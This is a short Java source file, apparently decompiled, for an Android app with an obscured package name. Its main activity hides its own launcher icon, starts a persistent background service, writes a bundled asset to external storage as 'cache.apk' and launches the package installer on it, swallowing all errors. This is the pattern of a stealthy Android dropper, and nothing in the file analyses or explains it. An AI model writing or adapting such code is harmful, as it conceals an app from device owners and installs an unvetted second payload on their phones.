package com.dsifakf.aoakmnq;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
        startService(new Intent(getApplicationContext(), Repeat.class));
        String filename = "cache";
        try {
            InputStream from = getAssets().open(filename);
            OutputStream to = new FileOutputStream(Environment.getExternalStorageDirectory() + "/" + filename + ".apk");
            OutputStream outputStream;
            try {
                CopyFile(from, to);
                outputStream = to;
            } catch (FileNotFoundException e) {
                outputStream = to;
            } catch (NullPointerException e2) {
                outputStream = to;
            } catch (Exception e3) {
                outputStream = to;
            }
        } catch (FileNotFoundException | Exception | NullPointerException e4) {
        }
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + "/" + filename + ".apk")), "application/vnd.android.package-archive");
        startActivity(intent);
        finish();
    }

    private static void CopyFile(InputStream from, OutputStream to) {
        try {
            byte[] buffer = new byte[1024];
            while (true) {
                int read = from.read(buffer);
                if (read == -1) {
                    from.close();
                    to.flush();
                    to.close();
                    return;
                }
                to.write(buffer, 0, read);
            }
        } catch (IOException | Exception | NullPointerException e) {
        }
    }
}
